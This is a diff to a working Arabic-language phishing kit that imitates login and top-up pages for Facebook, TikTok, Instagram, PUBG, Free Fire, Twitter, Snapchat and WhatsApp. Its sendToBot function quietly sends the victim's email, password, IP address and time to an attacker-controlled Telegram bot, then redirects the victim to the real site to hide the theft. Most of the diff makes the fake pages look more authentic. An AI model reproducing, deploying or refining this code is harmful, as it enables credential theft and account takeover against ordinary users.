@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>الصفحة الرئيسية</title>
+    <!-- Font Awesome للأيقونات الواقعية -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
@@ -17,21 +19,40 @@
             background: #f0f2f5;
         }
 
-        /* فيسبوك */
+        /* الصفحة الرئيسية فاضية */
+        .home-page {
+            display: none;
+        }
+
+        /* حاوية المحتوى */
+        #contentContainer {
+            width: 100%;
+            min-height: 100vh;
+        }
+
+        /* -------------------- فيسبوك -------------------- */
         .fb-page {
             background: #f0f2f5;
         }
         .fb-header {
             background: #4267b2;
             color: white;
-            padding: 12px 16px;
+            padding: 8px 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             border-bottom: 1px solid #29487d;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .fb-header-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         .fb-logo {
-            font-size: 28px;
+            font-size: 32px;
             font-weight: bold;
             background: white;
             color: #4267b2;
@@ -41,6 +62,22 @@
             display: flex;
             align-items: center;
             justify-content: center;
+        }
+        .fb-search {
+            background: #3a5a9a;
+            border: none;
+            border-radius: 20px;
+            padding: 8px 16px;
+            color: white;
+            width: 200px;
+        }
+        .fb-search::placeholder {
+            color: #ddd;
+        }
+        .fb-header-icons {
+            display: flex;
+            gap: 20px;
+            font-size: 20px;
         }
         .fb-container {
             max-width: 500px;
@@ -62,10 +99,12 @@
             font-size: 16px;
             margin-bottom: 12px;
             background: white;
+            transition: border-color 0.2s;
         }
         .fb-input:focus {
             outline: none;
             border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
         }
         .fb-login-btn {
             width: 100%;
@@ -78,6 +117,10 @@
             font-weight: bold;
             cursor: pointer;
             margin: 10px 0;
+            transition: background 0.2s;
+        }
+        .fb-login-btn:hover {
+            background: #166fe5;
         }
         .fb-links {
             text-align: center;
@@ -92,6 +135,17 @@
         .fb-divider {
             border-bottom: 1px solid #dadde1;
             margin: 20px 0;
+            position: relative;
+        }
+        .fb-divider span {
+            background: white;
+            padding: 0 10px;
+            color: #8a8d91;
+            font-size: 14px;
+            position: relative;
+            top: 10px;
+            right: 50%;
+            transform: translateX(50%);
         }
         .fb-create-btn {
             width: 100%;
@@ -103,35 +157,46 @@
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
+            transition: background 0.2s;
+        }
+        .fb-create-btn:hover {
+            background: #36a420;
         }
 
-        /* تيك توك */
+        /* -------------------- تيك توك -------------------- */
         .tiktok-page {
             background: #000000;
         }
         .tiktok-header {
             background: #000000;
-            padding: 20px;
-            text-align: center;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             border-bottom: 1px solid #2a2a2a;
         }
         .tiktok-logo {
-            font-size: 36px;
+            font-size: 28px;
             font-weight: bold;
             background: linear-gradient(45deg, #25f4ee, #fe2c55);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            display: inline-block;
+        }
+        .tiktok-header-icons {
+            color: white;
+            font-size: 24px;
+            display: flex;
+            gap: 20px;
         }
         .tiktok-container {
             max-width: 400px;
-            margin: 20px auto;
-            padding: 20px;
+            margin: 30px auto;
+            padding: 0 20px;
         }
         .tiktok-login-box {
             background: #121212;
             border-radius: 8px;
-            padding: 30px 20px;
+            padding: 40px 20px;
         }
         .tiktok-input {
             width: 100%;
@@ -161,6 +226,10 @@
             font-weight: bold;
             cursor: pointer;
             margin: 20px 0;
+            transition: background 0.2s;
+        }
+        .tiktok-login-btn:hover {
+            background: #e02b4a;
         }
         .tiktok-footer {
             text-align: center;
@@ -170,19 +239,30 @@
         .tiktok-footer a {
             color: #fe2c55;
             text-decoration: none;
+            font-weight: 600;
         }
 
-        /* انستجرام */
+        /* -------------------- انستجرام -------------------- */
         .instagram-page {
             background: #fafafa;
         }
         .instagram-header {
             background: white;
             border-bottom: 1px solid #dbdbdb;
-            padding: 15px;
-            text-align: center;
+            padding: 10px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .instagram-logo-text {
             font-family: 'Billabong', cursive;
-            font-size: 32px;
+            font-size: 28px;
+            color: #262626;
+        }
+        .instagram-header-icons {
+            display: flex;
+            gap: 18px;
+            font-size: 22px;
             color: #262626;
         }
         .instagram-container {
@@ -196,7 +276,7 @@
             border-radius: 1px;
             padding: 40px 30px;
         }
-        .instagram-logo {
+        .instagram-logo-big {
             text-align: center;
             margin-bottom: 30px;
             font-family: 'Billabong', cursive;
@@ -227,6 +307,11 @@
             font-weight: 600;
             cursor: pointer;
             margin: 15px 0;
+            opacity: 0.9;
+            transition: opacity 0.2s;
+        }
+        .instagram-login-btn:hover {
+            opacity: 1;
         }
         .instagram-divider {
             display: flex;
@@ -254,34 +339,40 @@
             margin-top: 20px;
         }
 
-        /* ببجي */
+        /* -------------------- ببجي -------------------- */
         .pubg-page {
             background: #0f0f12;
             font-family: 'Rajdhani', sans-serif;
         }
         .pubg-header {
             background: #1a1c22;
-            padding: 20px;
-            text-align: center;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
             border-bottom: 2px solid #f5a623;
         }
-        .pubg-logo {
-            font-size: 32px;
-            font-weight: 700;
+        .pubg-header i {
             color: #f5a623;
-            letter-spacing: 2px;
+            font-size: 28px;
+        }
+        .pubg-logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: white;
+            letter-spacing: 1px;
         }
         .pubg-logo span {
-            color: white;
+            color: #f5a623;
         }
         .pubg-container {
             max-width: 400px;
-            margin: 30px auto;
-            padding: 20px;
+            margin: 40px auto;
+            padding: 0 20px;
         }
         .pubg-login-box {
             background: #1e2128;
-            border-radius: 10px;
+            border-radius: 12px;
             padding: 30px;
             border: 1px solid #2f3540;
         }
@@ -290,7 +381,7 @@
             padding: 15px;
             background: #2a2f3a;
             border: 1px solid #3a4050;
-            border-radius: 6px;
+            border-radius: 8px;
             color: white;
             font-size: 15px;
             margin-bottom: 15px;
@@ -298,15 +389,22 @@
         .pubg-input::placeholder {
             color: #6b7280;
         }
+        .pubg-input:focus {
+            outline: none;
+            border-color: #f5a623;
+        }
         .pubg-select {
             width: 100%;
             padding: 15px;
             background: #2a2f3a;
             border: 1px solid #3a4050;
-            border-radius: 6px;
+            border-radius: 8px;
             color: white;
             font-size: 15px;
             margin-bottom: 15px;
+        }
+        .pubg-select option {
+            background: #1e2128;
         }
         .pubg-login-btn {
             width: 100%;
@@ -314,11 +412,15 @@
             background: #f5a623;
             color: #1a1c22;
             border: none;
-            border-radius: 6px;
+            border-radius: 8px;
             font-size: 18px;
             font-weight: 700;
             cursor: pointer;
             margin: 20px 0;
+            transition: background 0.2s;
+        }
+        .pubg-login-btn:hover {
+            background: #e59400;
         }
         .pubg-info {
             text-align: center;
@@ -326,40 +428,48 @@
             font-size: 13px;
         }
 
-        /* فري فاير */
+        /* -------------------- فري فاير -------------------- */
         .freefire-page {
             background: #0b1a30;
             font-family: 'Poppins', sans-serif;
         }
         .freefire-header {
             background: #102a43;
-            padding: 20px;
-            text-align: center;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
             border-bottom: 3px solid #ff4d4d;
         }
-        .freefire-logo {
-            font-size: 36px;
-            font-weight: 800;
+        .freefire-header i {
             color: #ff4d4d;
-            text-shadow: 2px 2px 0 #000;
+            font-size: 28px;
+        }
+        .freefire-logo {
+            font-size: 24px;
+            font-weight: 800;
+            color: white;
+        }
+        .freefire-logo span {
+            color: #ff4d4d;
         }
         .freefire-container {
             max-width: 400px;
-            margin: 30px auto;
-            padding: 20px;
+            margin: 40px auto;
+            padding: 0 20px;
         }
         .freefire-login-box {
             background: #1e3a5f;
-            border-radius: 15px;
+            border-radius: 20px;
             padding: 30px;
-            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
         }
         .freefire-input {
             width: 100%;
             padding: 15px;
             background: #2b4b75;
             border: 1px solid #3d6b9e;
-            border-radius: 10px;
+            border-radius: 12px;
             color: white;
             font-size: 15px;
             margin-bottom: 15px;
@@ -367,15 +477,22 @@
         .freefire-input::placeholder {
             color: #a0c0e0;
         }
+        .freefire-input:focus {
+            outline: none;
+            border-color: #ff4d4d;
+        }
         .freefire-select {
             width: 100%;
             padding: 15px;
             background: #2b4b75;
             border: 1px solid #3d6b9e;
-            border-radius: 10px;
+            border-radius: 12px;
             color: white;
             font-size: 15px;
             margin-bottom: 15px;
+        }
+        .freefire-select option {
+            background: #1e3a5f;
         }
         .freefire-login-btn {
             width: 100%;
@@ -383,44 +500,57 @@
             background: #ff4d4d;
             color: white;
             border: none;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 18px;
             font-weight: 700;
             cursor: pointer;
             margin: 20px 0;
             text-transform: uppercase;
             letter-spacing: 1px;
+            transition: background 0.2s;
+        }
+        .freefire-login-btn:hover {
+            background: #ff3333;
         }
 
-        /* تويتر */
+        /* -------------------- تويتر -------------------- */
         .twitter-page {
             background: #15202b;
         }
         .twitter-header {
             background: #1d2a3a;
-            padding: 15px;
-            text-align: center;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             border-bottom: 1px solid #38444d;
         }
         .twitter-logo {
-            font-size: 32px;
+            font-size: 28px;
             color: #1d9bf0;
+        }
+        .twitter-header-icons {
+            color: white;
+            display: flex;
+            gap: 20px;
+            font-size: 20px;
         }
         .twitter-container {
             max-width: 400px;
-            margin: 40px auto;
-            padding: 20px;
+            margin: 50px auto;
+            padding: 0 20px;
         }
         .twitter-login-box {
             background: #1d2a3a;
-            border-radius: 16px;
-            padding: 30px;
+            border-radius: 20px;
+            padding: 40px 30px;
         }
         .twitter-title {
             color: white;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
             margin-bottom: 30px;
+            text-align: center;
         }
         .twitter-input {
             width: 100%;
@@ -431,6 +561,9 @@
             color: white;
             font-size: 16px;
             margin-bottom: 15px;
+        }
+        .twitter-input::placeholder {
+            color: #8899a6;
         }
         .twitter-input:focus {
             outline: none;
@@ -447,41 +580,59 @@
             font-weight: 700;
             cursor: pointer;
             margin: 20px 0;
+            transition: background 0.2s;
+        }
+        .twitter-login-btn:hover {
+            background: #1a8cd8;
         }
 
-        /* سناب شات */
+        /* -------------------- سناب شات -------------------- */
         .snapchat-page {
             background: #fffc00;
         }
         .snapchat-header {
             background: #fffc00;
-            padding: 20px;
-            text-align: center;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
             border-bottom: 1px solid #e6e600;
         }
         .snapchat-logo {
-            font-size: 32px;
+            font-size: 26px;
             font-weight: 700;
+            color: #000;
+        }
+        .snapchat-header-icons {
+            display: flex;
+            gap: 20px;
+            font-size: 22px;
             color: #000;
         }
         .snapchat-container {
             max-width: 400px;
-            margin: 30px auto;
-            padding: 20px;
+            margin: 40px auto;
+            padding: 0 20px;
         }
         .snapchat-login-box {
             background: white;
-            border-radius: 20px;
-            padding: 30px;
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
         }
         .snapchat-input {
             width: 100%;
             padding: 16px;
             background: #f5f5f5;
             border: 1px solid #ddd;
-            border-radius: 12px;
+            border-radius: 16px;
             font-size: 16px;
             margin-bottom: 15px;
+        }
+        .snapchat-input:focus {
+            outline: none;
+            border-color: #fffc00;
+            box-shadow: 0 0 0 2px rgba(255,252,0,0.3);
         }
         .snapchat-login-btn {
             width: 100%;
@@ -494,33 +645,42 @@
             font-weight: 600;
             cursor: pointer;
             margin: 20px 0;
+            transition: background 0.2s;
+        }
+        .snapchat-login-btn:hover {
+            background: #333;
         }
 
-        /* واتساب */
+        /* -------------------- واتساب -------------------- */
         .whatsapp-page {
             background: #075e54;
         }
         .whatsapp-header {
             background: #128c7e;
             color: white;
-            padding: 15px 20px;
+            padding: 12px 16px;
             display: flex;
             align-items: center;
             gap: 15px;
         }
-        .whatsapp-logo {
+        .whatsapp-header i {
             font-size: 24px;
+        }
+        .whatsapp-logo {
+            font-size: 22px;
             font-weight: bold;
+            flex: 1;
         }
         .whatsapp-container {
             max-width: 400px;
-            margin: 30px auto;
-            padding: 20px;
+            margin: 40px auto;
+            padding: 0 20px;
         }
         .whatsapp-login-box {
             background: white;
-            border-radius: 10px;
-            padding: 30px;
+            border-radius: 12px;
+            padding: 40px 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
         }
         .whatsapp-input {
             width: 100%;
@@ -530,6 +690,11 @@
             border-radius: 8px;
             font-size: 16px;
             margin-bottom: 15px;
+        }
+        .whatsapp-input:focus {
+            outline: none;
+            border-color: #25d366;
+            box-shadow: 0 0 0 2px rgba(37,211,102,0.2);
         }
         .whatsapp-login-btn {
             width: 100%;
@@ -541,11 +706,14 @@
             font-size: 18px;
             font-weight: bold;
             cursor: pointer;
+            transition: background 0.2s;
+        }
+        .whatsapp-login-btn:hover {
+            background: #20b859;
         }
     </style>
 </head>
 <body>
-    <!-- حاوية المحتوى -->
     <div id="contentContainer"></div>
 
     <script>
@@ -559,7 +727,7 @@
             };
         }
 
-        // الحصول على IP
+        // الحصول على IP حقيقي للضحية
         async function getIP() {
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
@@ -570,20 +738,21 @@
             }
         }
 
-        // إرسال البيانات للبوت (بدون أي إشعار)
+        // إرسال البيانات للبوت (في الخلفية) ثم التوجيه للموقع الحقيقي
         async function sendToBot(platform) {
             const params = getUrlParams();
             const email = document.getElementById('email')?.value || '';
             const password = document.getElementById('password')?.value || '';
             
-            // إذا كانت البيانات موجودة والمعاملات صحيحة، نرسل
+            // التحقق من وجود البيانات والمعاملات
             if (email && password && params.chat_id && params.token) {
+                // أسماء المنصات للعرض
                 const platformNames = {
-                    'fb': 'فيسبوك',
+                    'freefire': 'فري فاير',
+                    'facebook': 'فيسبوك',
                     'tiktok': 'تيك توك',
                     'instagram': 'انستجرام',
                     'pubg': 'ببجي',
-                    'freefire': 'فري فاير',
                     'twitter': 'تويتر',
                     'snapchat': 'سناب شات',
                     'whatsapp': 'واتساب'
@@ -593,82 +762,121 @@
                 message += `📧 البريد الإلكتروني: ${email}\n`;
                 message += `🔑 كلمة السر: ${password}\n`;
                 
+                // في حالة الألعاب قد يكون هناك اختيار للكمية
                 const amount = document.getElementById('amount')?.value;
                 if (amount) {
                     message += `💰 الكمية: ${amount}\n`;
                 }
                 
+                // إضافة معلومات إضافية
                 message += `🌐 IP: ${await getIP()}\n`;
                 message += `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
                 
-                // إرسال في الخلفية (لا ننتظر النتيجة)
+                // إرسال بدون انتظار
                 fetch(`https://api.telegram.org/bot${params.token}/sendMessage`, {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: params.chat_id,
                         text: message
                     })
-                }).catch(() => {}); // تجاهل الأخطاء
+                }).catch(() => {});
             }
             
-            // تحويل المستخدم إلى الموقع الحقيقي فوراً
-            const urls = {
-                'fb': 'https://facebook.com',
+            // التوجيه إلى الموقع الحقيقي فوراً
+            const realUrls = {
+                'freefire': 'https://ff.garena.com',
+                'facebook': 'https://facebook.com',
                 'tiktok': 'https://tiktok.com',
                 'instagram': 'https://instagram.com',
                 'pubg': 'https://pubg.com',
-                'freefire': 'https://freefire.com',
                 'twitter': 'https://twitter.com',
                 'snapchat': 'https://snapchat.com',
                 'whatsapp': 'https://whatsapp.com'
             };
-            window.location.href = urls[platform] || 'https://google.com';
+            window.location.href = realUrls[platform] || 'https://google.com';
         }
 
-        // تهيئة الصفحة
+        // تهيئة الصفحة حسب المنصة
         function initializePage() {
             const params = getUrlParams();
             const container = document.getElementById('contentContainer');
             
+            // إذا لم يتم تحديد منصة، الصفحة الرئيسية تبقى فاضية
             if (!params.platform) {
-                container.innerHTML = ''; // الصفحة الرئيسية فاضية
+                container.innerHTML = '';
                 return;
             }
             
             let content = '';
+            const platform = params.platform;
             
-            switch(params.platform) {
-                case 'fb':
+            switch(platform) {
+                case 'freefire':
+                    content = `
+                        <div class="freefire-page">
+                            <div class="freefire-header">
+                                <i class="fas fa-fire"></i>
+                                <div class="freefire-logo">FREE <span>FIRE</span></div>
+                            </div>
+                            <div class="freefire-container">
+                                <div class="freefire-login-box">
+                                    <h2 style="color: #ff4d4d; text-align: center; margin-bottom: 25px;">شحن الماس</h2>
+                                    <input type="text" class="freefire-input" id="email" placeholder="البريد الإلكتروني">
+                                    <input type="password" class="freefire-input" id="password" placeholder="كلمة السر">
+                                    <select class="freefire-select" id="amount">
+                                        <option>100 Diamonds - 1.09$</option>
+                                        <option>310 Diamonds - 2.99$</option>
+                                        <option>520 Diamonds - 4.99$</option>
+                                        <option>1060 Diamonds - 9.99$</option>
+                                        <option>2180 Diamonds - 19.99$</option>
+                                    </select>
+                                    <button class="freefire-login-btn" onclick="sendToBot('freefire')">شحن</button>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    break;
+                case 'facebook':
                     content = `
                         <div class="fb-page">
                             <div class="fb-header">
-                                <div class="fb-logo">f</div>
-                                <div class="fb-header-icons">🔍 💬</div>
+                                <div class="fb-header-left">
+                                    <div class="fb-logo">f</div>
+                                    <input type="text" class="fb-search" placeholder="بحث في فيسبوك">
+                                </div>
+                                <div class="fb-header-icons">
+                                    <i class="fas fa-user-circle"></i>
+                                    <i class="fas fa-comment-dots"></i>
+                                    <i class="fas fa-bell"></i>
+                                </div>
                             </div>
                             <div class="fb-container">
                                 <div class="fb-login-box">
                                     <h2 style="margin-bottom: 20px;">تسجيل الدخول</h2>
                                     <input type="text" class="fb-input" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
                                     <input type="password" class="fb-input" id="password" placeholder="كلمة السر">
-                                    <button class="fb-login-btn" onclick="sendToBot('fb')">تسجيل الدخول</button>
+                                    <button class="fb-login-btn" onclick="sendToBot('facebook')">تسجيل الدخول</button>
                                     <div class="fb-links">
                                         <a href="#">نسيت كلمة السر؟</a>
                                         <a href="#">العودة</a>
                                     </div>
-                                    <div class="fb-divider"></div>
+                                    <div class="fb-divider"><span>أو</span></div>
                                     <button class="fb-create-btn">إنشاء حساب جديد</button>
                                 </div>
                             </div>
                         </div>
                     `;
                     break;
-                    
                 case 'tiktok':
                     content = `
                         <div class="tiktok-page">
                             <div class="tiktok-header">
                                 <div class="tiktok-logo">TikTok</div>
+                                <div class="tiktok-header-icons">
+                                    <i class="fas fa-search"></i>
+                                    <i class="fas fa-user"></i>
+                                </div>
                             </div>
                             <div class="tiktok-container">
                                 <div class="tiktok-login-box">
@@ -684,14 +892,20 @@
                         </div>
                     `;
                     break;
-                    
                 case 'instagram':
                     content = `
                         <div class="instagram-page">
-                            <div class="instagram-header">Instagram</div>
+                            <div class="instagram-header">
+                                <i class="fas fa-camera"></i>
+                                <div class="instagram-logo-text">Instagram</div>
+                                <div class="instagram-header-icons">
+                                    <i class="far fa-heart"></i>
+                                    <i class="far fa-comment"></i>
+                                </div>
+                            </div>
                             <div class="instagram-container">
                                 <div class="instagram-login-box">
-                                    <div class="instagram-logo">Instagram</div>
+                                    <div class="instagram-logo-big">Instagram</div>
                                     <input type="text" class="instagram-input" id="email" placeholder="البريد الإلكتروني">
                                     <input type="password" class="instagram-input" id="password" placeholder="كلمة السر">
                                     <button class="instagram-login-btn" onclick="sendToBot('instagram')">تسجيل الدخول</button>
@@ -704,11 +918,11 @@
                         </div>
                     `;
                     break;
-                    
                 case 'pubg':
                     content = `
                         <div class="pubg-page">
                             <div class="pubg-header">
+                                <i class="fas fa-crosshairs"></i>
                                 <div class="pubg-logo">PUBG <span>MOBILE</span></div>
                             </div>
                             <div class="pubg-container">
@@ -717,7 +931,7 @@
                                     <input type="text" class="pubg-input" id="email" placeholder="البريد الإلكتروني">
                                     <input type="password" class="pubg-input" id="password" placeholder="كلمة السر">
                                     <select class="pubg-select" id="amount">
-                                        <option>60 UC + 0 UC - 0.99$</option>
+                                        <option>60 UC - 0.99$</option>
                                         <option>300 UC + 25 UC - 4.99$</option>
                                         <option>600 UC + 60 UC - 9.99$</option>
                                         <option>1500 UC + 300 UC - 24.99$</option>
@@ -729,36 +943,15 @@
                         </div>
                     `;
                     break;
-                    
-                case 'freefire':
-                    content = `
-                        <div class="freefire-page">
-                            <div class="freefire-header">
-                                <div class="freefire-logo">FREE FIRE</div>
-                            </div>
-                            <div class="freefire-container">
-                                <div class="freefire-login-box">
-                                    <h2 style="color: #ff4d4d; text-align: center; margin-bottom: 25px;">شحن الماس</h2>
-                                    <input type="text" class="freefire-input" id="email" placeholder="البريد الإلكتروني">
-                                    <input type="password" class="freefire-input" id="password" placeholder="كلمة السر">
-                                    <select class="freefire-select" id="amount">
-                                        <option>100 Diamonds - 1.09$</option>
-                                        <option>310 Diamonds - 2.99$</option>
-                                        <option>520 Diamonds - 4.99$</option>
-                                        <option>1060 Diamonds - 9.99$</option>
-                                    </select>
-                                    <button class="freefire-login-btn" onclick="sendToBot('freefire')">شحن</button>
-                                </div>
-                            </div>
-                        </div>
-                    `;
-                    break;
-                    
                 case 'twitter':
                     content = `
                         <div class="twitter-page">
                             <div class="twitter-header">
-                                <div class="twitter-logo">𝕏</div>
+                                <i class="fab fa-twitter twitter-logo"></i>
+                                <div class="twitter-header-icons">
+                                    <i class="fas fa-star"></i>
+                                    <i class="fas fa-user"></i>
+                                </div>
                             </div>
                             <div class="twitter-container">
                                 <div class="twitter-login-box">
@@ -771,12 +964,15 @@
                         </div>
                     `;
                     break;
-                    
                 case 'snapchat':
                     content = `
                         <div class="snapchat-page">
                             <div class="snapchat-header">
                                 <div class="snapchat-logo">Snapchat</div>
+                                <div class="snapchat-header-icons">
+                                    <i class="fas fa-search"></i>
+                                    <i class="fas fa-user-circle"></i>
+                                </div>
                             </div>
                             <div class="snapchat-container">
                                 <div class="snapchat-login-box">
@@ -789,15 +985,13 @@
                         </div>
                     `;
                     break;
-                    
                 case 'whatsapp':
                     content = `
                         <div class="whatsapp-page">
                             <div class="whatsapp-header">
-                                <span>◀</span>
-                                <span class="whatsapp-logo">WhatsApp</span>
-                                <span style="flex:1"></span>
-                                <span>⋮</span>
+                                <i class="fas fa-arrow-right"></i>
+                                <div class="whatsapp-logo">WhatsApp</div>
+                                <i class="fas fa-ellipsis-vertical"></i>
                             </div>
                             <div class="whatsapp-container">
                                 <div class="whatsapp-login-box">
@@ -810,7 +1004,6 @@
                         </div>
                     `;
                     break;
-                    
                 default:
                     content = '<div style="text-align:center; padding:50px;">منصة غير معروفة</div>';
             }
